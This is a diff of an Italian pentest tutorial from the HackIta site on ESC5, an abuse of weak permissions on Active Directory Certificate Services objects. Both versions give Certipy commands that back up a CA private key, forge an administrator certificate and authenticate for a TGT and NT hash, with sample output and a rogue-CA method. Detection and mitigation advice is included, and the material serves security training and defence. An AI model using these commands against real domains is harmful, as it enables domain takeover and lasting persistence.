@@ -16,99 +16,344 @@ tags:
   - esc
 ---
 
-ESC5 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che colpisce direttamente l'infrastruttura PKI del dominio.
+ESC5 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che sfrutta **ACL deboli su oggetti PKI in Active Directory**.
 
-Invece di sfruttare un singolo certificate template, ESC5 prende di mira gli **oggetti PKI nel Configuration Naming Context** o il **server Certificate Authority stesso**. Se un attaccante ottiene accesso alla chiave privata della CA, può generare **Golden Certificates** e impersonare qualsiasi utente del dominio.
+A differenza di:
 
-## In questa guida vediamo **come sfruttare ESC5 ADCS con Certipy**, dalla compromissione della CA fino alla creazione di certificati validi per **Administrator o qualsiasi altro account Active Directory**.
+* **ESC4 → ACL sui certificate template**
+* **ESC7 → permessi sulla CA**
 
-## Quando ESC5 ADCS È Sfruttabile
-
-* L'attaccante ha permessi di scrittura su oggetti PKI nel Configuration Naming Context:
-  * `CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration`
-  * Container AIA e CDP
-  * `CN=Certificate Templates,CN=Public Key Services`
-  * Oggetti OID policy
-  * Computer account del server CA
-* Compromissione del server CA (accesso shell)
+ESC5 riguarda **altri oggetti PKI nel Configuration container**.
 
 ***
 
-## Exploit ESC5 ADCS Con Certipy
+# Dove si trovano questi oggetti
 
-Certipy **non rileva direttamente ESC5** con `find`. Serve analisi manuale delle ACL con BloodHound, PowerShell, o ADSIEdit.
+Gli oggetti PKI sono salvati in:
 
-Se la CA è compromessa, Certipy supporta il **Golden Certificate** — la forma più persistente di domain dominance via ADCS.
-
-### Step 1 — Backup della chiave privata CA (richiede accesso admin alla CA)
-
-```bash
-certipy ca -u 'administrator@corp.local' -p 'Password123' -ns 10.0.0.100 -target CA.CORP.LOCAL -config 'CA.CORP.LOCAL\CORP-CA' -backup
+```
+CN=Public Key Services,CN=Services,CN=Configuration
 ```
 
-### Step 2 — Forgia un certificato come qualsiasi utente
+Esempi importanti:
 
-```bash
-certipy forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
+```
+CN=NTAuthCertificates
+CN=AIA
+CN=CDP
+CN=Certification Authorities
+CN=Certificate Templates
 ```
 
-### Step 3 — Autenticati con il certificato forgiato
+***
 
-```bash
-certipy auth -pfx 'administrator_forged.pfx' -dc-ip 10.0.0.100
+# Quando esiste ESC5
+
+ESC5 esiste quando un utente ha permessi come:
+
+```
+WriteDACL
+WriteOwner
+WriteProperty
+FullControl
 ```
 
-Il Golden Certificate funziona finché la CA esiste. Sopravvive a password reset, a rotazione di krbtgt, a quasi tutto.
+su questi oggetti PKI.
+
+Questo permette di **modificare il trust della PKI del dominio**.
 
 ***
 
-## Output Dell'Attacco ESC5
+# Attacchi possibili
 
-* **Golden Certificate** — capacità di forgiare certificati per qualsiasi utente, indefinitamente
-* **TGT + NT hash** di qualsiasi account
-* Persistenza a lungo termine nel dominio
+Con accesso a questi oggetti l’attaccante può:
 
-***
+```
+aggiungere una CA malevola
+modificare trust PKI
+alterare AIA/CDP
+manipolare policy OID
+```
 
-## Detection ESC5 ADCS
+Il caso più potente è modificare:
 
-* Audita tutte le ACL sotto `CN=Public Key Services,CN=Services,CN=Configuration`
-* Monitora accessi al server CA (logon, accesso file, accesso registro)
-* Verifica l'integrità della chiave privata CA
-
-***
-
-## Mitigation ESC5 ADCS
-
-* Restringi i permessi di scrittura sugli oggetti PKI ai soli amministratori Tier-0
-* Tratta il server CA come asset **Tier-0** (stesso livello dei Domain Controller)
-* Proteggi la chiave privata CA con HSM
+```
+NTAuthCertificates
+```
 
 ***
 
-## FAQ — ESC5 ADCS
+# NTAuthCertificates
 
-### Cos'è ESC5 in ADCS?
+Oggetto:
 
-ESC5 è l'abuso di ACL deboli sugli oggetti PKI a livello di infrastruttura AD (non singoli template). Permette di manipolare l'intera PKI o, in caso di compromissione della CA, di forgiare certificati illimitati.
+```
+CN=NTAuthCertificates,CN=Public Key Services
+```
 
-### Come sfruttare ESC5 con Certipy?
+Questo store contiene **le CA trusted per autenticazione AD**.
 
-Certipy non rileva ESC5 automaticamente. Se la CA è compromessa, si usa `certipy ca -backup` per estrarre la chiave privata, poi `certipy forge` per creare certificati come qualsiasi utente.
+Se un attaccante inserisce una CA propria:
 
-### ESC5 permette Domain Admin?
+```
+rogue CA
+```
 
-Sì — e molto di più. Il Golden Certificate permette di impersonare qualsiasi utente del dominio indefinitamente. È la forma più persistente di controllo del dominio via ADCS.
+può emettere certificati validi per:
 
-### Qual è la differenza tra ESC5 e ESC4?
+```
+Kerberos PKINIT
+Smartcard logon
+```
 
-[ESC4](https://hackita.it/articoli/esc4-adcs) colpisce un singolo template tramite ACL deboli. ESC5 colpisce l'infrastruttura PKI stessa — oggetti container, NTAuthCertificates, server CA.
+***
 
-**Key Takeaway:** Se un attaccante compromette la CA, può forgiare certificati per qualsiasi utente indefinitamente — il Golden Certificate è il Golden Ticket della PKI.
+# Identificazione ESC5
 
-> ESC5 rappresenta il livello più alto di compromissione **Active Directory Certificate Services**. Per capire l'intera superficie di attacco leggi la guida completa: [ADCS ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16).\
-> Continua con le tecniche successive: [ESC6 ADCS](https://hackita.it/articoli/esc6-adcs) · [ESC7 ADCS](https://hackita.it/articoli/esc7-adcs).Se questo contenuto ti è utile puoi **supportare HackIta** su [Supporta](https://hackita.it/supporto).\
-> Vuoi imparare **pentesting Active Directory e offensive security 1:1** oppure **testare la sicurezza del tuo sito o infrastruttura aziendale**? Vai su [Servizi HackIta](https://hackita.it/servizi).Riferimenti tecnici:\
-> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)\
-> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)\
-> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
+Certipy **non rileva ESC5 automaticamente**.
+
+Serve analizzare ACL sugli oggetti PKI.
+
+***
+
+# Tool utili
+
+### BloodHound
+
+Con ADCS data collection.
+
+***
+
+### PowerShell
+
+```powershell
+Get-ACL "AD:\CN=NTAuthCertificates,CN=Public Key Services,..."
+```
+
+***
+
+### ADSIEdit
+
+Navigazione manuale.
+
+***
+
+# Oggetti da controllare
+
+Audit su:
+
+```
+CN=NTAuthCertificates
+CN=AIA
+CN=CDP
+CN=Certification Authorities
+CN=Certificate Templates
+```
+
+Indicatori pericolosi:
+
+```
+Authenticated Users
+Domain Users
+```
+
+con permessi di scrittura.
+
+***
+
+# Exploitation ESC5
+
+ESC5 dipende molto dall’oggetto compromesso.
+
+Un caso comune:
+
+1️⃣ aggiungere rogue CA
+2️⃣ emettere certificati admin
+3️⃣ autenticarsi
+
+***
+
+# Compromissione CA key
+
+Se l’attaccante ottiene la **chiave privata della CA**, può creare:
+
+```
+Golden Certificates
+```
+
+***
+
+# Backup CA key con Certipy
+
+```bash
+certipy ca \
+-u administrator@corp.local -p 'Passw0rd!' \
+-ns 10.0.0.100 \
+-target CA.CORP.LOCAL \
+-config CA.CORP.LOCAL\CORP-CA \
+-backup
+```
+
+Output:
+
+```
+Saving certificate and private key to CORP-CA.pfx
+```
+
+***
+
+# Forging certificate
+
+Con la chiave CA:
+
+```bash
+certipy forge \
+-ca-pfx CORP-CA.pfx \
+-upn administrator@corp.local \
+-sid S-1-5-21-...-500 \
+-crl ldap:///
+```
+
+Output:
+
+```
+administrator_forged.pfx
+```
+
+***
+
+# Autenticazione
+
+```bash
+certipy auth \
+-pfx administrator_forged.pfx \
+-dc-ip 10.0.0.100
+```
+
+Output:
+
+```
+Got TGT
+Got NT hash for administrator
+```
+
+Accesso ottenuto:
+
+```
+Domain Admin
+```
+
+***
+
+# Impatto ESC5
+
+ESC5 può portare a:
+
+```
+Enterprise Admin
+Domain Admin
+Golden Certificates
+persistent domain compromise
+```
+
+È uno degli attacchi **più persistenti su AD CS**.
+
+***
+
+# Detection ESC5
+
+Indicatori principali:
+
+```
+WriteDACL
+WriteOwner
+FullControl
+```
+
+su oggetti PKI.
+
+Audit tramite:
+
+```
+BloodHound
+ADSIEdit
+PowerShell ACL review
+```
+
+***
+
+# Mitigation ESC5
+
+### Limitare ACL PKI
+
+Solo gruppi come:
+
+```
+Enterprise Admins
+PKI Admins
+```
+
+devono avere permessi.
+
+***
+
+### Audit periodico
+
+Controllare ACL su:
+
+```
+CN=Public Key Services
+```
+
+***
+
+### Monitor NTAuthCertificates
+
+Modifiche a questo oggetto sono **critiche**.
+
+***
+
+### Hardening PKI
+
+Limitare accesso a:
+
+```
+AIA
+CDP
+Certification Authorities
+OID containers
+```
+
+***
+
+# FAQ — ESC5 ADCS
+
+### Cos'è ESC5?
+
+ACL deboli su oggetti PKI in Active Directory.
+
+### Qual è il rischio?
+
+Modificare la **trust chain PKI del dominio**.
+
+### ESC5 porta a Domain Admin?
+
+Sì, e anche **Enterprise Admin**.
+
+### ESC5 è comune?
+
+Molto meno di ESC1 ma **molto più potente**.
+
+***
+
+**Key Takeaway:** se un attaccante può modificare oggetti PKI come NTAuthCertificates, può creare una CA trusted e generare certificati validi per autenticazione nel dominio.
+
+***
+
+> Guida completa AD CS escalation:
+> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con:
+> [https://hackita.it/articoli/esc6-adcs](https://hackita.it/articoli/esc6-adcs) · [https://hackita.it/articoli/esc7-adcs](https://hackita.it/articoli/esc7-adcs)Supporta HackIta:
+> [https://hackita.it/supporto](https://hackita.it/supporto)Pentest Active Directory o formazione offensiva:
+> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
+> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
+> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
